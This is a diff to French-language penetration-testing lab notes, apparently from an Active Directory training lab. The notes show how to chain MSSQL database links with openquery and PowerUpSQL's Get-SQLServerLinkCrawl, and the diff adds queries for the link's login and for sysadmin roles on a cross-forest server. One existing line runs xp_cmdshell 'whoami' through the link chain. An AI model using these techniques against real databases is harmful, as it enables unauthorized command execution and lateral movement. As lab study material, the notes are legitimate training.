@@ -21,8 +21,10 @@ Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
 
 ```sql
 select * from master..sysservers
+select srvname, isremote from master..sysservers          -- format court pour flag F37 (1er srvname avec isremote=1)
 select * from openquery("DCORP-SQL1",'select * from master..sysservers')
 select * from openquery("DCORP-SQL1",'select * from openquery("DCORPMGMT",''select * from master..sysservers'')')
+select * from openquery("DCORP-SQL1",'select system_user')  -- login SQL utilisé par le lien sortant (flag F38)
 ```
 
 Ces requêtes imbriquées montrent le chaînage `DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT` — c'est exactement ce que `Get-SQLServerLinkCrawl` automatise ensuite.
@@ -32,12 +34,24 @@ Ces requêtes imbriquées montrent le chaînage `DCORP-MSSQL → DCORP-SQL1 → 
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version'
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "select system_user"                     # login SQL courant côté link (F38)
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <target>
 ```
 
 Commencer par une requête de lecture (`SELECT @@version`) avant `xp_cmdshell` pour confirmer la portée réelle de la chaîne sans déclencher d'exécution.
 
+### Privilèges SQL en bout de chaîne (F39, cross-forest)
+
+```powershell
+# Check sysadmin rapide (1/0)
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "SELECT IS_SRVROLEMEMBER('sysadmin')" -QueryTarget eu-sql
+# Lister tous les rôles serveur possédés par le login effectif
+Get-SQLServerLinkCrawl -Instance dcorp-mssql `
+  -Query "SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER(name, SUSER_NAME()) = 1" `
+  -QueryTarget eu-sql
+```
+
 **Link**
 - [[Synthèse - MSSQL]]
 - [[Cheatsheet - Trusts et forêts]]
-- [[Cheatsheet - Outils Windows Linux]]
+- [[Cheatsheet - PowerShell]]
